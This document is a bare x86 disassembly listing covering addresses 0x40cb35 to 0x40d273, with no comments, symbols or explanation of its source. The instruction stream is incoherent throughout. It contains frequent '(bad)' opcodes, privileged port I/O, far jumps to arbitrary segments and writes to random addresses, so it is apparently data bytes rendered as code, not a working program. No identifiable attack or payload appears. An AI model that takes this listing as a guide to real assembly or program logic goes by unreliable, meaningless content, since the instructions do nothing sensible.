  40cb35:	jns    0x40cba4
  40cb37:	fwait
  40cb38:	push   esp
  40cb39:	push   ebp
  40cb3a:	mov    al,0x73
  40cb3c:	jecxz  0x40cac8
  40cb3e:	cmp    ecx,DWORD PTR ds:0xf404cc69
  40cb44:	mov    ecx,fs
  40cb46:	jg     0x40cbaf
  40cb48:	pop    edx
  40cb49:	das    
  40cb4a:	xor    dl,BYTE PTR [eax]
  40cb4c:	repz fisub WORD PTR [edi]
  40cb4f:	fsub   DWORD PTR [edi]
  40cb51:	mov    esp,0x37345f6c
  40cb56:	xchg   edx,eax
  40cb57:	mov    ds:0xd8612e06,al
  40cb5c:	pop    esi
  40cb5d:	clc    
  40cb5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb5f:	jbe    0x40cb03
  40cb61:	lods   al,BYTE PTR ds:[esi]
  40cb62:	sbb    al,0x9
  40cb64:	outs   dx,BYTE PTR ds:[esi]
  40cb65:	(bad)  
  40cb66:	mov    eax,0x3f5676f5
  40cb6b:	in     al,0xf8
  40cb6d:	dec    eax
  40cb6e:	inc    eax
  40cb6f:	xor    DWORD PTR [edx],ecx
  40cb71:	adc    esp,edx
  40cb73:	or     DWORD PTR [edx-0x32],ebx
  40cb76:	stos   BYTE PTR es:[edi],al
  40cb77:	ror    ebx,0x5d
  40cb7a:	scas   al,BYTE PTR es:[edi]
  40cb7b:	xchg   ebp,eax
  40cb7c:	xor    BYTE PTR [ebx],dh
  40cb7e:	icebp  
  40cb7f:	in     al,dx
  40cb80:	pop    edx
  40cb81:	cli    
  40cb82:	imul   esp,DWORD PTR [ebp+0x31],0xf95c4c47
  40cb89:	daa    
  40cb8a:	cmp    BYTE PTR [edx],ch
  40cb8c:	mov    edi,0xd4f12ba6
  40cb91:	mov    dh,0xde
  40cb93:	(bad)  
  40cb94:	int    0x87
  40cb96:	dec    ebx
  40cb97:	jae    0x40cb1f
  40cb99:	retf   0xaf87
  40cb9c:	and    eax,DWORD PTR [edi]
  40cb9e:	pop    ss
  40cb9f:	std    
  40cba0:	gs sub al,0x47
  40cba3:	xchg   ebx,eax
  40cba4:	cs inc esp
  40cba6:	mov    ch,0x72
  40cba8:	or     edi,edi
  40cbaa:	scas   al,BYTE PTR es:[edi]
  40cbab:	mov    al,bh
  40cbad:	adc    ch,al
  40cbaf:	adc    ah,BYTE PTR [edi]
  40cbb1:	(bad)  
  40cbb3:	xchg   esp,eax
  40cbb4:	scas   eax,DWORD PTR es:[edi]
  40cbb5:	mov    ah,0x76
  40cbb7:	fistp  QWORD PTR [esi+0x40]
  40cbba:	cmp    al,0x18
  40cbbc:	xor    edx,DWORD PTR [edi-0x632f0327]
  40cbc2:	push   0xe
  40cbc4:	xchg   DWORD PTR [eax],ebx
  40cbc6:	jb     0x40cb99
  40cbc8:	adc    al,0xd
  40cbca:	mov    eax,ds:0x808c8cc9
  40cbcf:	out    dx,al
  40cbd0:	jecxz  0x40cb96
  40cbd2:	push   esi
  40cbd3:	pop    ecx
  40cbd4:	leave  
  40cbd5:	sub    al,dl
  40cbd7:	les    ebp,FWORD PTR [esi+0x52]
  40cbda:	xchg   BYTE PTR [ecx-0x424445a7],ah
  40cbe0:	push   ebp
  40cbe1:	sbb    dl,BYTE PTR [edi-0x9295923]
  40cbe7:	js     0x40cbb0
  40cbe9:	pop    ebx
  40cbea:	je     0x40cb89
  40cbec:	aas    
  40cbed:	leave  
  40cbee:	or     ah,BYTE PTR [ebp-0x6b]
  40cbf1:	std    
  40cbf2:	sti    
  40cbf3:	inc    ecx
  40cbf4:	retf   0xfea5
  40cbf7:	adc    BYTE PTR [bx+si-0x3943],bl
  40cbfc:	jmp    0x40cc01
  40cbfe:	out    0x71,al
  40cc00:	leave  
  40cc01:	adc    dl,bl
  40cc03:	clc    
  40cc04:	push   esp
  40cc05:	sbb    ecx,DWORD PTR [edx]
  40cc07:	cmp    eax,0x146d378c
  40cc0c:	dec    esi
  40cc0d:	mov    eax,0x1e112989
  40cc12:	loope  0x40cc71
  40cc14:	sahf   
  40cc15:	repnz test al,0x74
  40cc18:	fidiv  WORD PTR [ebx+0x67]
  40cc1b:	jp     0x40cc81
  40cc1d:	sbb    BYTE PTR [esi],ah
  40cc1f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40cc21:	pop    ebp
  40cc22:	mov    ch,0x9e
  40cc24:	cmc    
  40cc25:	lea    ebx,[edi]
  40cc27:	sbb    DWORD PTR [edi],esi
  40cc29:	add    eax,0x210d1162
  40cc2e:	xchg   DWORD PTR [edi+edx*2],edx
  40cc31:	sti    
  40cc32:	jmp    0x3a980f40
  40cc37:	xor    cl,ah
  40cc39:	cdq    
  40cc3a:	pop    es
  40cc3b:	mov    BYTE PTR [ecx+0x2c],bh
  40cc3e:	cmp    BYTE PTR [ebx],ah
  40cc40:	and    BYTE PTR [ecx-0x9c2909],dh
  40cc46:	sub    al,0x0
  40cc48:	jp     0x40ccaf
  40cc4a:	jns    0x40cc7f
  40cc4c:	jo     0x40cc16
  40cc4e:	xchg   esi,eax
  40cc4f:	out    0x94,al
  40cc51:	sbb    al,BYTE PTR [ecx+0x4]
  40cc54:	imul   ebp,DWORD PTR [ebx+0xb],0x17e1f8dd
  40cc5b:	cld    
  40cc5c:	iret   
  40cc5d:	nop
  40cc5e:	jo     0x40cc0a
  40cc60:	xor    dh,BYTE PTR [esi+0x10]
  40cc63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc64:	push   esi
  40cc65:	pushf  
  40cc66:	ret    
  40cc67:	pop    ebx
  40cc68:	xchg   ebp,eax
  40cc69:	jno    0x40ccd3
  40cc6b:	ins    BYTE PTR es:[edi],dx
  40cc6c:	xchg   eax,edx
  40cc6e:	loop   0x40cc97
  40cc70:	repnz mov edx,0x4db12e90
  40cc76:	retf   0x8c3c
  40cc79:	jns    0x40cc1f
  40cc7b:	(bad)  
  40cc7c:	int3   
  40cc7d:	inc    eax
  40cc7e:	lods   al,BYTE PTR ds:[esi]
  40cc7f:	jo     0x40ccda
  40cc81:	cmp    ah,BYTE PTR ds:0x1a6faddd
  40cc87:	mov    dl,0xc6
  40cc89:	xor    dl,ah
  40cc8b:	int3   
  40cc8c:	fistp  QWORD PTR [ecx]
  40cc8e:	or     cl,BYTE PTR [esi+esi*4-0x50]
  40cc92:	out    dx,al
  40cc93:	test   bl,0xfe
  40cc96:	mov    esi,0xbce9162b
  40cc9b:	push   ebp
  40cc9c:	pusha  
  40cc9d:	inc    eax
  40cc9e:	aas    
  40cc9f:	stos   BYTE PTR es:[edi],al
  40cca0:	inc    ecx
  40cca1:	jge    0x40cc5a
  40cca3:	sub    eax,0xf76ce6fb
  40cca8:	loope  0x40cca4
  40ccaa:	sbb    ebp,esp
  40ccac:	(bad)  
  40ccad:	pushf  
  40ccae:	mov    ah,0x1f
  40ccb0:	jne    0x40ccea
  40ccb2:	mov    BYTE PTR [eax-0x77],0x6f
  40ccb6:	popa   
  40ccb7:	call   FWORD PTR [edx]
  40ccb9:	popf   
  40ccba:	jnp    0x40ccd9
  40ccbc:	sti    
  40ccbd:	push   cs
  40ccbe:	ja     0x40cd01
  40ccc0:	dec    esp
  40ccc1:	jns    0x40ccc9
  40ccc3:	lds    ebx,FWORD PTR [edi+0x1f23789]
  40ccc9:	in     al,dx
  40ccca:	xchg   edi,eax
  40cccb:	jo     0x40ccbb
  40cccd:	jmp    0xc484:0x99d15f6a
  40ccd4:	int    0x38
  40ccd6:	and    bh,BYTE PTR [eax+0x1b]
  40ccd9:	jae    0x40cc6b
  40ccdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccdc:	mov    esi,0x24675a13
  40cce1:	cmp    BYTE PTR [ecx+ecx*8-0x60e7dbbb],al
  40cce8:	jne    0x40ccab
  40ccea:	loop   0x40cd44
  40ccec:	(bad)  
  40cced:	in     al,dx
  40ccee:	aas    
  40ccef:	jmp    0x40cceb
  40ccf1:	add    eax,0xb6d2971b
  40ccf6:	dec    edi
  40ccf7:	loopne 0x40cd32
  40ccf9:	jbe    0x40cd4e
  40ccfb:	enter  0x4faa,0x3d
  40ccff:	or     eax,esi
  40cd01:	xchg   edx,eax
  40cd02:	loopne 0x40cd20
  40cd04:	jnp    0x40cd72
  40cd06:	fcmovne st,st(7)
  40cd08:	xchg   edx,eax
  40cd09:	cs inc ebx
  40cd0b:	jnp    0x40cd80
  40cd0d:	mov    dl,0x65
  40cd0f:	fmul   st,st(0)
  40cd11:	ins    BYTE PTR es:[edi],dx
  40cd12:	das    
  40cd13:	xlat   BYTE PTR ds:[ebx]
  40cd14:	jmp    0xa026c72b
  40cd19:	je     0x40cd94
  40cd1b:	mov    ebx,0x3faa948e
  40cd20:	add    DWORD PTR [ebp-0x4e],ebp
  40cd23:	je     0x40cd8c
  40cd25:	mov    bl,BYTE PTR [ecx+0x77c98ad4]
  40cd2b:	add    dh,bh
  40cd2d:	sbb    ebp,ecx
  40cd2f:	pop    esi
  40cd30:	dec    edx
  40cd31:	ja     0x40cd31
  40cd33:	jmp    0xab89fb99
  40cd38:	call   FWORD PTR [ecx+0x3a]
  40cd3b:	jmp    FWORD PTR [ecx-0x52]
  40cd3e:	or     DWORD PTR [edi+0x7cbafcf5],0x43
  40cd45:	sbb    cx,WORD PTR [edi]
  40cd48:	adc    ebx,DWORD PTR [esi]
  40cd4a:	push   0xfffffff7
  40cd4c:	scas   al,BYTE PTR es:[edi]
  40cd4d:	cs xchg ebx,eax
  40cd4f:	addr16 mov edx,0x9bd25dda
  40cd55:	(bad)  
  40cd56:	outs   dx,DWORD PTR ds:[esi]
  40cd57:	cwde   
  40cd58:	and    BYTE PTR ss:[esi-0x33],0x81
  40cd5d:	dec    ebx
  40cd5e:	mov    eax,0x90a6674f
  40cd63:	loop   0x40cda4
  40cd65:	sbb    ch,ah
  40cd67:	fisubr DWORD PTR [eax+0x72]
  40cd6a:	lods   eax,DWORD PTR ds:[esi]
  40cd6b:	mov    eax,0xdf7db6b1
  40cd70:	inc    ebp
  40cd71:	out    0x1e,eax
  40cd73:	inc    ecx
  40cd74:	fcomp  QWORD PTR [edi+0x7845e6e0]
  40cd7a:	outs   dx,DWORD PTR ds:[esi]
  40cd7b:	imul   ebx,DWORD PTR [edi+0x27],0xb171befc
  40cd82:	lods   al,BYTE PTR ds:[esi]
  40cd83:	test   BYTE PTR [ebp+0x9575607],ch
  40cd89:	or     BYTE PTR gs:[esp+edx*8],bh
  40cd8d:	jle    0x40cd6f
  40cd8f:	addr16 add eax,0xb4e6f575
  40cd95:	push   edx
  40cd96:	popa   
  40cd97:	push   0xbe47a5a7
  40cd9c:	or     al,0x32
  40cd9e:	ja     0x40cdc4
  40cda0:	aas    
  40cda1:	popf   
  40cda2:	sbb    dl,0x22
  40cda5:	or     eax,0xdd9c1945
  40cdaa:	inc    ebp
  40cdab:	cmp    ebp,DWORD PTR [ecx+0x2a65ec2]
  40cdb1:	lock sub al,0xdd
  40cdb4:	adc    BYTE PTR [ebx+0x58cafa87],bh
  40cdba:	mov    ch,0xc6
  40cdbc:	aaa    
  40cdbd:	mov    ds:0x4542dc6e,eax
  40cdc2:	jp     0x40cd47
  40cdc4:	test   eax,0xa18290d
  40cdc9:	shr    DWORD PTR [ebx],cl
  40cdcb:	scas   al,BYTE PTR es:[edi]
  40cdcc:	retf   
  40cdcd:	xor    eax,0xf97601f1
  40cdd2:	adc    bl,BYTE PTR ds:0x180480ae
  40cdd8:	sbb    eax,0xff39331d
  40cddd:	mov    al,0x61
  40cddf:	jle    0x40cd94
  40cde1:	sbb    esp,esi
  40cde3:	and    edi,ebp
  40cde5:	pop    ebx
  40cde6:	xlat   BYTE PTR ds:[ebx]
  40cde7:	mov    dh,0xc
  40cde9:	in     eax,dx
  40cdea:	das    
  40cdeb:	push   ecx
  40cdec:	mov    dl,0x5e
  40cdee:	sbb    esp,DWORD PTR [ebx-0x17]
  40cdf1:	pop    ss
  40cdf2:	jns    0x40ce27
  40cdf4:	gs sti 
  40cdf6:	push   edi
  40cdf7:	lahf   
  40cdf8:	js     0x40cdf6
  40cdfa:	(bad)  
  40cdfb:	mov    WORD PTR [edi],fs
  40cdfd:	test   al,0x5b
  40cdff:	sub    al,0xcd
  40ce01:	sub    al,ch
  40ce03:	mov    BYTE PTR [ecx*4+0x50983328],0x1d
  40ce0b:	enter  0xf916,0x5
  40ce0f:	xor    DWORD PTR [edi],esi
  40ce11:	pop    eax
  40ce12:	ins    DWORD PTR es:[edi],dx
  40ce13:	mov    ds:0x5dafc05f,eax
  40ce18:	mov    bl,0xb1
  40ce1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce1b:	xor    DWORD PTR [ebx-0x3b22b29e],eax
  40ce21:	retf   0x9bad
  40ce24:	dec    edi
  40ce25:	in     eax,dx
  40ce26:	adc    al,BYTE PTR ds:0x23da1d95
  40ce2c:	shr    DWORD PTR [ebp+ecx*4-0x6de3c98e],1
  40ce33:	pusha  
  40ce34:	mov    eax,ds:0x3fcf6eca
  40ce39:	sbb    al,0x33
  40ce3b:	jno    0x40cdfe
  40ce3d:	mov    ds:0x332c82fb,al
  40ce42:	mov    BYTE PTR [eax-0x5795e393],ch
  40ce48:	ret    
  40ce49:	(bad)  
  40ce4a:	loope  0x40cdd2
  40ce4c:	xor    dl,BYTE PTR [ebx]
  40ce4e:	or     DWORD PTR [edi+0x3857dfe0],ebx
  40ce54:	add    BYTE PTR [eax+0x78],0xfb
  40ce58:	lods   al,BYTE PTR ds:[esi]
  40ce59:	sub    ecx,ebx
  40ce5b:	xrstor [ebx]
  40ce5e:	cmp    ecx,DWORD PTR [ebx+0x25]
  40ce61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce62:	clc    
  40ce63:	inc    esi
  40ce64:	repz retf 0x7151
  40ce68:	and    ebx,DWORD PTR [esi-0x11]
  40ce6b:	fidiv  WORD PTR [eax]
  40ce6d:	mov    ebx,0xb5787a98
  40ce72:	jns    0x40ce5e
  40ce74:	test   eax,0xc84cfbcc
  40ce79:	mov    ecx,0xf1fa3c00
  40ce7e:	push   ebp
  40ce7f:	ins    DWORD PTR es:[edi],dx
  40ce80:	mov    edi,0x8c7f55d3
  40ce85:	mov    esp,0x707046d3
  40ce8a:	cdq    
  40ce8b:	stos   DWORD PTR es:[edi],eax
  40ce8c:	xchg   ebp,edi
  40ce8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce8f:	test   al,0x62
  40ce91:	pop    edx
  40ce92:	in     al,dx
  40ce93:	sbb    ebx,esp
  40ce95:	and    al,0xe
  40ce97:	aas    
  40ce98:	pusha  
  40ce99:	add    al,0x82
  40ce9b:	adc    al,0xea
  40ce9d:	jmp    0xd557:0x11399a3f
  40cea4:	mov    ah,0xad
  40cea6:	mov    BYTE PTR [ebp+0x43c908f0],al
  40ceac:	mov    ebp,0x3d546b5e
  40ceb1:	ins    BYTE PTR es:[edi],dx
  40ceb2:	cmp    DWORD PTR [edi-0x3d],ebp
  40ceb5:	sbb    dl,dh
  40ceb7:	pusha  
  40ceb8:	push   ds
  40ceb9:	repz js 0x40ce82
  40cebc:	fisttp DWORD PTR [eax-0x2625b6c4]
  40cec2:	xlat   BYTE PTR ds:[ebx]
  40cec3:	inc    esp
  40cec4:	cmp    al,0xc6
  40cec6:	adc    bl,bl
  40cec8:	jns    0x40ceb8
  40ceca:	or     DWORD PTR [ecx-0x3aaa65],esp
  40ced0:	test   DWORD PTR [eax-0x5dec3432],ebp
  40ced6:	adc    BYTE PTR [esi],cl
  40ced8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ced9:	add    ch,ah
  40cedb:	jo     0x40cf1c
  40cedd:	lds    ebx,FWORD PTR [ecx]
  40cedf:	pop    es
  40cee0:	(bad)  
  40cee1:	scas   al,BYTE PTR es:[edi]
  40cee2:	add    DWORD PTR [ecx+0x5761d609],edi
  40cee8:	jmp    0x4cba:0x35931ff4
  40ceef:	jb     0x40cf29
  40cef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cef2:	jb     0x40ceb2
  40cef4:	fs ins BYTE PTR es:[edi],dx
  40cef6:	fwait
  40cef7:	xchg   ah,bh
  40cef9:	pop    eax
  40cefa:	stos   DWORD PTR es:[edi],eax
  40cefb:	sub    DWORD PTR [eax+0x5aa7be7b],ebp
  40cf01:	xor    al,0xb
  40cf03:	push   es
  40cf04:	xor    dl,BYTE PTR [esi]
  40cf06:	xor    DWORD PTR [esi+0x6bc1c250],0xd48b39b9
  40cf10:	mov    bl,0xce
  40cf12:	enter  0x4796,0x2
  40cf16:	sbb    DWORD PTR [edi-0xf],ecx
  40cf19:	loope  0x40cf16
  40cf1b:	cwde   
  40cf1c:	push   esi
  40cf1d:	inc    edx
  40cf1e:	mov    ebx,edi
  40cf20:	test   BYTE PTR [edx+0x7e],dh
  40cf23:	into   
  40cf24:	mov    eax,ds:0xc9957f6a
  40cf29:	sbb    ecx,DWORD PTR [ecx+ebp*1+0x2a2f0e77]
  40cf30:	sbb    esi,DWORD PTR [edi+0x275ee95d]
  40cf36:	add    al,0x30
  40cf38:	fild   DWORD PTR [edx+0x12]
  40cf3b:	cmp    al,0x9a
  40cf3d:	and    DWORD PTR [ebp+0x49],0xffffffa1
  40cf41:	adc    al,0x4a
  40cf43:	into   
  40cf44:	outs   dx,DWORD PTR ds:[esi]
  40cf45:	icebp  
  40cf46:	lahf   
  40cf47:	imul   eax,DWORD PTR ds:0x2dd146f5,0x953f82f
  40cf51:	mov    ah,BYTE PTR [eax+0x52]
  40cf54:	or     eax,0x7443bb69
  40cf59:	jle    0x40cfbe
  40cf5b:	cs inc eax
  40cf5d:	adc    DWORD PTR [edx-0x19],ecx
  40cf60:	in     eax,dx
  40cf61:	icebp  
  40cf62:	call   DWORD PTR [edx+0x3ed0bcdb]
  40cf68:	outs   dx,BYTE PTR ds:[esi]
  40cf69:	and    eax,0xe0cc7016
  40cf6e:	add    bl,dh
  40cf70:	xchg   edx,eax
  40cf71:	jne    0x40cf33
  40cf73:	pop    esp
  40cf74:	or     cl,bl
  40cf76:	mov    ebx,0xb5235cd2
  40cf7b:	add    eax,0x2ccabc15
  40cf80:	daa    
  40cf81:	adc    eax,0x42138a01
  40cf86:	out    0x5f,al
  40cf88:	xor    DWORD PTR [ebp-0x7a],0x1b
  40cf8c:	imul   esp,DWORD PTR [ebp-0x7e],0x62
  40cf90:	ins    BYTE PTR es:[edi],dx
  40cf91:	adc    DWORD PTR [edi-0x2d],esp
  40cf94:	jle    0x40cf66
  40cf96:	(bad)  
  40cf97:	and    eax,0x9d36dbbe
  40cf9c:	or     eax,0x39282262
  40cfa1:	inc    ebx
  40cfa2:	lods   eax,DWORD PTR ds:[esi]
  40cfa3:	mov    al,0x8e
  40cfa5:	push   ds
  40cfa6:	xchg   esi,eax
  40cfa7:	iret   
  40cfa8:	cmp    al,0x4a
  40cfaa:	xor    al,0x4e
  40cfac:	(bad)  
  40cfad:	dec    esp
  40cfae:	(bad)  
  40cfaf:	ror    DWORD PTR [ebx+eax*2-0x67bb1096],cl
  40cfb6:	rcl    ah,cl
  40cfb8:	outs   dx,BYTE PTR ds:[si]
  40cfba:	adc    al,0xd6
  40cfbc:	test   DWORD PTR [esi+0x5b48bec],edi
  40cfc2:	push   eax
  40cfc3:	sar    DWORD PTR [ecx],0x9c
  40cfc6:	lahf   
  40cfc7:	fwait
  40cfc8:	js     0x40cfb5
  40cfca:	retf   0xa473
  40cfcd:	sbb    eax,0xe96afad3
  40cfd2:	(bad)  
  40cfd3:	daa    
  40cfd4:	test   DWORD PTR [ebx-0x31a8c7f9],ebx
  40cfda:	sbb    DWORD PTR [ecx-0x4d],edi
  40cfdd:	dec    DWORD PTR [ebp+0x34e4013a]
  40cfe3:	jmp    0x40cfc9
  40cfe5:	les    esp,FWORD PTR [ebx]
  40cfe7:	jne    0x40d04f
  40cfe9:	sbb    al,BYTE PTR [ebp-0x194b7cb1]
  40cfef:	xchg   esi,eax
  40cff0:	mov    al,0xe
  40cff2:	cvtps2pd xmm6,xmm2
  40cff5:	call   0x5a47:0xc6c4959c
  40cffc:	mov    ah,0xc7
  40cffe:	repz sub eax,0x211f552
  40d004:	hlt    
  40d005:	mov    bl,BYTE PTR [esi]
  40d007:	jle    0x40d003
  40d009:	jmp    0x9fca926f
  40d00e:	sub    ebp,edx
  40d010:	in     eax,dx
  40d011:	call   FWORD PTR [edi+0x24164ee4]
  40d017:	shl    BYTE PTR [ebp-0x17],1
  40d01a:	iret   
  40d01b:	in     eax,dx
  40d01c:	mov    edi,0x75c2133d
  40d021:	sbb    BYTE PTR ss:[esp+ecx*4+0x62a3fe9a],bh
  40d029:	sub    DWORD PTR [ebx+0x31675cc7],eax
  40d02f:	inc    edx
  40d030:	mov    ds:0xc612aae5,al
  40d035:	rol    BYTE PTR [eax+ebx*2],0x8d
  40d039:	push   es
  40d03a:	adc    eax,0x7ab911dd
  40d03f:	xchg   ebx,eax
  40d040:	lahf   
  40d041:	out    0xdc,eax
  40d043:	into   
  40d044:	xchg   ch,bl
  40d046:	inc    esi
  40d047:	push   ebp
  40d048:	int3   
  40d049:	test   DWORD PTR [eax-0x9],ebx
  40d04c:	pop    edi
  40d04d:	add    BYTE PTR [ebx+ebp*8],bh
  40d050:	les    esp,FWORD PTR [eax]
  40d052:	in     eax,dx
  40d053:	inc    ebp
  40d054:	push   0xffffffd5
  40d056:	sar    DWORD PTR [esi-0x1ea2b9c2],1
  40d05c:	and    bl,dh
  40d05e:	xchg   ecx,eax
  40d05f:	pop    edi
  40d060:	sbb    al,0x46
  40d062:	in     al,0x25
  40d064:	out    0x23,eax
  40d066:	hlt    
  40d067:	jae    0x40cfea
  40d069:	pop    es
  40d06a:	jae    0x40d004
  40d06c:	cwde   
  40d06d:	push   0xfffffffc
  40d06f:	mov    ebp,0x5cecef77
  40d074:	xchg   ecx,eax
  40d075:	imul   eax,ecx,0xcf72c642
  40d07b:	gs std 
  40d07d:	(bad)  
  40d07e:	je     0x40d0e4
  40d080:	cli    
  40d081:	imul   edi,DWORD PTR [ebx+edx*2+0x6e],0xcc9d8cf2
  40d089:	dec    ebp
  40d08a:	xchg   esi,eax
  40d08b:	sub    al,dl
  40d08d:	push   ecx
  40d08e:	sub    ch,0xff
  40d091:	std    
  40d092:	mov    cl,0x6
  40d094:	ror    BYTE PTR [edi-0x4a4a0d15],0x57
  40d09b:	out    dx,al
  40d09c:	ror    BYTE PTR [eax+0x4f],1
  40d09f:	inc    edi
  40d0a0:	push   esi
  40d0a1:	popa   
  40d0a2:	sub    al,0xd8
  40d0a4:	into   
  40d0a5:	xor    dl,BYTE PTR [eax]
  40d0a7:	addr16 xchg edx,eax
  40d0a9:	jae    0x40d0e7
  40d0ab:	sub    esi,DWORD PTR [ebx-0x52c0e516]
  40d0b1:	das    
  40d0b2:	adc    bh,BYTE PTR [eax-0x24]
  40d0b5:	dec    edx
  40d0b6:	imul   esp,DWORD PTR [edi+eiz*2-0x50],0x2d
  40d0bb:	ret    
  40d0bc:	loop   0x40d065
  40d0be:	push   edx
  40d0bf:	shl    DWORD PTR [ebp-0x4d],cl
  40d0c2:	mov    ds:0x6db3abff,eax
  40d0c7:	stos   BYTE PTR es:[edi],al
  40d0c8:	xor    ah,BYTE PTR [ecx]
  40d0ca:	push   ss
  40d0cb:	xchg   ecx,eax
  40d0cc:	lahf   
  40d0cd:	lods   al,BYTE PTR ds:[esi]
  40d0ce:	mov    ds:0x8120735c,al
  40d0d3:	and    edi,DWORD PTR [ebp+0x1101b147]
  40d0d9:	add    edx,DWORD PTR ds:0x4cbb8a24
  40d0df:	ds push ecx
  40d0e1:	push   es
  40d0e2:	mov    ds:0xc0efd755,al
  40d0e7:	fistp  QWORD PTR [ebx]
  40d0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ea:	rcl    al,0x52
  40d0ed:	pop    esp
  40d0ee:	jae    0x40d107
  40d0f0:	in     al,dx
  40d0f1:	xor    al,0x8
  40d0f3:	mov    ch,0xfd
  40d0f5:	mov    edx,DWORD PTR [ebp+0x1a3cb7c7]
  40d0fb:	adc    ebp,DWORD PTR [ebx]
  40d0fd:	jmp    0x40d117
  40d0ff:	js     0x40d124
  40d101:	jg     0x40d0ca
  40d103:	cmp    eax,0xb107097a
  40d108:	xor    ch,BYTE PTR [edi+eiz*8-0x536e786b]
  40d10f:	ins    DWORD PTR es:[edi],dx
  40d110:	pop    ecx
  40d111:	in     eax,dx
  40d112:	ss add al,0x4b
  40d115:	adc    al,0x2
  40d117:	in     al,dx
  40d118:	push   cs
  40d119:	bound  esi,QWORD PTR [eax+edi*2+0x87ac26]
  40d120:	push   ss
  40d121:	sti    
  40d122:	adc    edx,DWORD PTR [edx+ebx*8-0xcdd03d]
  40d129:	mov    WORD PTR [ebx+0x3b94e13c],?
  40d12f:	enter  0x4822,0x29
  40d133:	lods   eax,DWORD PTR ds:[esi]
  40d134:	retf   
  40d135:	inc    edx
  40d136:	mov    esp,DWORD PTR [edx+0x4]
  40d139:	jnp    0x40d0d7
  40d13b:	xor    ebx,DWORD PTR [ebx+esi*2+0x6d6edf2e]
  40d142:	mov    ch,0xe6
  40d144:	mov    eax,0x4d08a6e7
  40d149:	aaa    
  40d14a:	push   0x62
  40d14c:	mov    BYTE PTR [esi],bh
  40d14e:	add    BYTE PTR [edi-0xbd8c35f],cl
  40d154:	mov    cl,0xe1
  40d156:	mov    esi,0x38fe8c19
  40d15b:	adc    bh,BYTE PTR [ebp+ebx*8-0x48f73afe]
  40d162:	or     BYTE PTR [edi-0x4b44de34],dl
  40d168:	push   cs
  40d169:	mov    cl,0x9
  40d16b:	div    DWORD PTR [ebp+ebx*8-0x1da7935e]
  40d172:	(bad)  
  40d173:	aam    0x87
  40d175:	jge    0x40d183
  40d177:	and    al,0x4a
  40d179:	fcom   QWORD PTR [ebx+ecx*2]
  40d17c:	cmp    eax,0x93901982
  40d181:	push   ebp
  40d182:	loopne 0x40d12f
  40d184:	(bad)  
  40d186:	nop
  40d187:	ja     0x40d1be
  40d189:	xchg   ecx,edi
  40d18b:	dec    esi
  40d18c:	adc    BYTE PTR [eax-0x3f],bh
  40d18f:	xchg   esp,eax
  40d190:	outs   dx,DWORD PTR ds:[esi]
  40d191:	and    cl,BYTE PTR [esi]
  40d193:	adc    dh,bh
  40d195:	cmp    DWORD PTR [edi+0x60],ebp
  40d198:	sub    BYTE PTR [ebx-0x7e87da3e],bl
  40d19e:	inc    ebx
  40d19f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1a0:	xchg   BYTE PTR fs:0xb9883ba8,ah
  40d1a7:	and    edx,DWORD PTR [edi]
  40d1a9:	or     al,0x6d
  40d1ab:	and    BYTE PTR [eax-0xb],bl
  40d1ae:	fwait
  40d1af:	lea    esi,[edi]
  40d1b1:	ins    BYTE PTR es:[edi],dx
  40d1b2:	xor    eax,DWORD PTR [edi]
  40d1b4:	push   esp
  40d1b5:	retf   0xcca3
  40d1b8:	mov    edi,0x685a2058
  40d1bd:	call   0xce68c94
  40d1c2:	dec    edi
  40d1c3:	repz cli 
  40d1c5:	sbb    eax,0x464abe3
  40d1ca:	xchg   esp,eax
  40d1cb:	outs   dx,BYTE PTR ds:[esi]
  40d1cc:	pop    esi
  40d1cd:	(bad)  
  40d1ce:	pop    eax
  40d1cf:	lods   eax,DWORD PTR ds:[esi]
  40d1d0:	imul   ebx,DWORD PTR [edx+0x13aaa217],0x66
  40d1d7:	(bad)  
  40d1d8:	cli    
  40d1d9:	cmp    cl,BYTE PTR [edx+0x4d47c37e]
  40d1df:	push   cs
  40d1e0:	mov    ah,0xb0
  40d1e2:	pop    ebp
  40d1e3:	mov    ebp,ebx
  40d1e5:	data16 add BYTE PTR [esp+ebx*1],dl
  40d1e9:	rcr    DWORD PTR [ecx+0x28e75b28],cl
  40d1ef:	adc    al,BYTE PTR [edi]
  40d1f1:	ror    DWORD PTR [ebp+esi*4+0x68e8f53],cl
  40d1f8:	rcr    BYTE PTR [ebx+0x1405b891],1
  40d1fe:	loopne 0x40d22a
  40d200:	in     eax,dx
  40d201:	inc    ecx
  40d202:	xor    eax,0x14ec7591
  40d207:	sti    
  40d208:	scas   eax,DWORD PTR es:[edi]
  40d209:	dec    eax
  40d20a:	mov    cl,BYTE PTR [edx-0x6c06513f]
  40d210:	push   cs
  40d211:	adc    al,0x20
  40d213:	pop    esi
  40d214:	in     eax,0x58
  40d216:	pop    edx
  40d217:	repnz dec esp
  40d219:	mov    dh,BYTE PTR [ebx+0x4e2ba844]
  40d21f:	cld    
  40d220:	aam    0x92
  40d222:	mov    edi,eax
  40d224:	out    dx,eax
  40d225:	mov    BYTE PTR [ecx],cl
  40d227:	leave  
  40d228:	pop    eax
  40d229:	pop    ds
  40d22a:	fisub  DWORD PTR ds:0x69cd30bb
  40d230:	or     BYTE PTR [ebx-0x15f9d71f],cl
  40d236:	mov    eax,0xa81c8eb6
  40d23b:	bound  edx,QWORD PTR [ecx+0xb]
  40d23e:	imul   ecx,DWORD PTR [ebx+0x66693148],0xffffff8b
  40d245:	add    dl,BYTE PTR [edx-0x17a841f9]
  40d24b:	jg     0x40d2c3
  40d24d:	mov    bl,0xb3
  40d24f:	mov    edi,0xaaeb463
  40d254:	repz jmp DWORD PTR [esi+ebx*1]
  40d258:	mov    esi,0x43660bcf
  40d25d:	mov    edx,0x8cf0e966
  40d262:	and    DWORD PTR [edi+0x40a02803],0x95bc544
  40d26c:	std    
  40d26d:	loop   0x40d2c7
  40d26f:	retf   
  40d270:	ret    0x60bf
  40d273:	lods   al,BYTE PTR ds:[esi]
